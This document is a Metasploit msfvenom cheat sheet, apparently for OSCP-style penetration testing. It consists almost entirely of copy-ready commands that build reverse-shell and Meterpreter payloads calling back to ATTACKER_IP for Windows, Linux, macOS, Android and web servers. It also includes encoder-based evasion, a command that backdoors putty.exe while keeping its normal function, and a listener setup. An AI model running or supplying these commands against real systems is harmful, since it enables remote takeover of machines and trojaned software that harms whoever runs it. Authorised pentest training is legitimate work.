```
# List Payloads
msfvenom -l payloads

# List Payloads Filtered
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep meterpreter

# List Formats
msfvenom -l formats

# List Encoders
msfvenom -l encoders

# Windows EXE Reverse Shell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe

# Windows Meterpreter EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > meterpreter.exe

# Windows x64 Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > meterpreter64.exe

# Linux ELF Reverse Shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf

# Linux Meterpreter ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > meterpreter.elf

# PHP Reverse Shell
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php

# PHP Meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > meterpreter.php

# ASP Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f asp > shell.asp

# ASPX Reverse Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx > shell.aspx

# JSP Reverse Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.jsp

# WAR Reverse Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > shell.war

# Python Reverse Shell
msfvenom -p cmd/unix/reverse_python LHOST=ATTACKER_IP LPORT=4444 -f raw

# Bash Reverse Shell
msfvenom -p cmd/unix/reverse_bash LHOST=ATTACKER_IP LPORT=4444 -f raw

# Perl Reverse Shell
msfvenom -p cmd/unix/reverse_perl LHOST=ATTACKER_IP LPORT=4444 -f raw

# Netcat Reverse Shell
msfvenom -p cmd/unix/reverse_netcat LHOST=ATTACKER_IP LPORT=4444 -f raw

# PowerShell Reverse Shell
msfvenom -p windows/powershell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw

# PowerShell Encoded Command
msfvenom -p cmd/powershell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw

# HTA Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f hta-psh > shell.hta

# DLL Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll > shell.dll

# MSI Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi > shell.msi

# Python Payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw

# Bash Script Payload
msfvenom -p cmd/unix/reverse_bash LHOST=ATTACKER_IP LPORT=4444 -f sh > shell.sh

# ELF Shared Object
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf-so > shell.so

# MacOS Payload
msfvenom -p osx/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f macho > shell.macho

# Android Payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -o shell.apk

# Stageless Payloads
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > stageless.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > stageless.elf

# Meterpreter HTTPS Payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe > https.exe

# Bind Shell
msfvenom -p windows/shell_bind_tcp RHOST=TARGET_IP LPORT=4444 -f exe > bind.exe

# Shellcode Output - C
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f c

# Shellcode Output - Python
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f python

# Shellcode Output - Powershell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f psh

# Shellcode Output - Hex
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f hex

# Use Encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -f exe > encoded.exe

# Multiple Encoder Iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > encoded.exe

# Bad Characters
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b "\x00\x0a\x0d" -f exe > shell.exe

# Specify Platform
msfvenom -p generic/custom PAYLOADFILE=shellcode.bin -a x86 --platform windows -f exe > shell.exe

# Inject into Existing EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -x putty.exe -f exe > backdoor.exe

# Keep Original EXE Functionality
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -x putty.exe -k -f exe > backdoor.exe

# Web Delivery Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f psh-cmd

# Create Listener
msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST ATTACKER_IP;set LPORT 4444;run"

# Common OSCP Payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > shell.war
msfvenom -p cmd/unix/reverse_bash LHOST=ATTACKER_IP LPORT=4444 -f raw
msfvenom -p windows/powershell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw
```
